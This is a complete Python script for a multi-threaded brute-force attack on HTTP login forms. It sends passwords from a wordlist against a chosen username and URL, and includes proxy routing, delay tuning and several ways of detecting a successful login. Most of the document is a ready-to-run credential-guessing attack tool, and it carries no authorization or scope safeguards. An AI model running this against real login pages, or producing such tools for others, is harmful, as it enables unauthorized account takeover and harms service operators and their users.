#!/usr/bin/env python3
"""
Enhanced HTTP Login Brute-Force Script
Features: External wordlist, rate limiting, multi-threading, proxy support, advanced success detection
"""

import requests
import argparse
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
import threading

# Disable SSL warnings for testing environments
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Global flag for graceful shutdown
stop_flag = threading.Event()
found_credentials = None
lock = threading.Lock()

def load_wordlist(filepath):
    """Load passwords from external wordlist file."""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"[*] Loaded {len(passwords)} passwords from {filepath}")
        return passwords
    except FileNotFoundError:
        print(f"[-] Error: Wordlist file '{filepath}' not found")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error reading wordlist: {e}")
        sys.exit(1)

def check_success(response, success_string, success_code):
    """
    Advanced success detection with multiple methods.
    Returns True if login appears successful.
    """
    # Method 1: Check for success string in response body
    if success_string and success_string.lower() in response.text.lower():
        return True
    
    # Method 2: Check HTTP status code (e.g., 302 redirect after login)
    if response.status_code == success_code:
        return True
    
    # Method 3: Check for session cookies (common after successful login)
    session_cookies = ['session', 'sessionid', 'phpsessid', 'jsessionid', 'auth', 'token']
    for cookie in session_cookies:
        if cookie in response.cookies.get_dict():
            return True
    
    # Method 4: Check for redirect location (common after successful login)
    if response.status_code in [301, 302, 303, 307, 308]:
        location = response.headers.get('Location', '')
        if location and ('dashboard' in location.lower() or 'home' in location.lower() or 'welcome' in location.lower()):
            return True
    
    return False

def brute_force_attempt(url, username, password, proxy, success_string, success_code, timeout, delay, verbose):
    """Single brute-force attempt with rate limiting."""
    
    # Check if we should stop (password already found)
    if stop_flag.is_set():
        return None
    
    # Rate limiting - delay before request
    if delay > 0:
        time.sleep(delay)
    
    # Prepare request
    data = {'username': username, 'password': password}
    proxies = None
    if proxy:
        proxies = {
            'http': proxy,
            'https': proxy
        }
    
    try:
        response = requests.post(
            url,
            data=data,
            proxies=proxies,
            timeout=timeout,
            allow_redirects=False,
            verify=False
        )
        
        # Check for success
        if check_success(response, success_string, success_code):
            with lock:
                global found_credentials
                if not found_credentials:  # Prevent multiple threads from setting
                    found_credentials = {'username': username, 'password': password}
                    stop_flag.set()  # Signal other threads to stop
                    return {'success': True, 'password': password, 'response': response}
        
        # Verbose output
        if verbose:
            print(f"[+] Tried: {password}", end='\r')
        
        return {'success': False, 'password': password}
        
    except requests.exceptions.Timeout:
        if verbose:
            print(f"[!] Timeout for password: {password}")
        return None
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error. Check target availability or proxy settings.")
        stop_flag.set()
        return None
    except Exception as e:
        if verbose:
            print(f"[!] Error with password {password}: {e}")
        return None

def run_brute_force(url, username, wordlist, threads, delay, proxy, success_string, success_code, timeout, verbose):
    """Execute multi-threaded brute-force attack."""
    
    print("=" * 70)
    print("ENHANCED HTTP LOGIN BRUTE-FORCE")
    print("=" * 70)
    print(f"[*] Target URL: {url}")
    print(f"[*] Username: {username}")
    print(f"[*] Wordlist: {wordlist}")
    print(f"[*] Threads: {threads}")
    print(f"[*] Delay: {delay}s per attempt")
    print(f"[*] Proxy: {proxy if proxy else 'None'}")
    print(f"[*] Success Detection: String='{success_string}', Code={success_code}")
    print("=" * 70)
    print("[*] Starting attack...\n")
    
    passwords = load_wordlist(wordlist)
    total_passwords = len(passwords)
    attempts = [0]
    
    def worker(password):
        """Worker function for thread pool."""
        if stop_flag.is_set():
            return
        
        result = brute_force_attempt(
            url, username, password, proxy, 
            success_string, success_code, timeout, delay, verbose
        )
        
        with lock:
            attempts[0] += 1
            if not stop_flag.is_set() and result and not result.get('success'):
                # Progress indicator (overwrite line)
                sys.stdout.write(f"[*] Progress: {attempts[0]}/{total_passwords} ({(attempts[0]/total_passwords*100):.2f}%) - Current: {password[:20]}{'...' if len(password) > 20 else ''}\r")
                sys.stdout.flush()
        
        return result
    
    # Execute with thread pool
    with ThreadPoolExecutor(max_workers=threads) as executor:
        # Submit all tasks
        futures = {executor.submit(worker, pwd): pwd for pwd in passwords}
        
        # Process results as they complete
        for future in as_completed(futures):
            if stop_flag.is_set():
                break
            
            result = future.result()
            if result and result.get('success'):
                print(f"\n\n{'=' * 70}")
                print("[+] LOGIN SUCCESSFUL!")
                print(f"{'=' * 70}")
                print(f"Username: {found_credentials['username']}")
                print(f"Password: {found_credentials['password']}")
                print(f"{'=' * 70}")
                
                # Shutdown remaining threads
                executor.shutdown(wait=False, cancel_futures=True)
                return found_credentials
    
    # If we get here, password not found
    if not found_credentials:
        print(f"\n[-] Password not found in wordlist ({total_passwords} attempts)")
    
    return None

def main():
    parser = argparse.ArgumentParser(
        description='Enhanced HTTP Login Brute-Force Script with Multi-threading',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 brute_force_enhanced.py -u http://target.com/login -U admin -w passwords.txt
  python3 brute_force_enhanced.py -u http://target.com/login -U admin -w rockyou.txt -t 20 -d 0.2
  python3 brute_force_enhanced.py -u http://target.com/login -U admin -w passwords.txt -p http://127.0.0.1:8080
  python3 brute_force_enhanced.py -u http://target.com/login -U admin -w passwords.txt -s "Welcome" -c 200
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target login URL')
    parser.add_argument('-U', '--username', required=True, help='Target username')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to password wordlist file')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of concurrent threads (default: 5)')
    parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between attempts in seconds (default: 0.1)')
    parser.add_argument('-p', '--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-s', '--success-string', default='Login successful', help='String to detect successful login')
    parser.add_argument('-c', '--success-code', type=int, default=302, help='HTTP status code indicating success (default: 302)')
    parser.add_argument('-T', '--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Show all attempts')
    
    args = parser.parse_args()
    
    # Validate inputs
    if args.threads < 1:
        print("[-] Error: Thread count must be at least 1")
        sys.exit(1)
    
    if args.delay < 0:
        print("[-] Error: Delay cannot be negative")
        sys.exit(1)
    
    # Run brute-force
    result = run_brute_force(
        args.url,
        args.username,
        args.wordlist,
        args.threads,
        args.delay,
        args.proxy,
        args.success_string,
        args.success_code,
        args.timeout,
        args.verbose
    )
    
    # Exit with appropriate code
    sys.exit(0 if result else 1)

if __name__ == '__main__':
    main()   
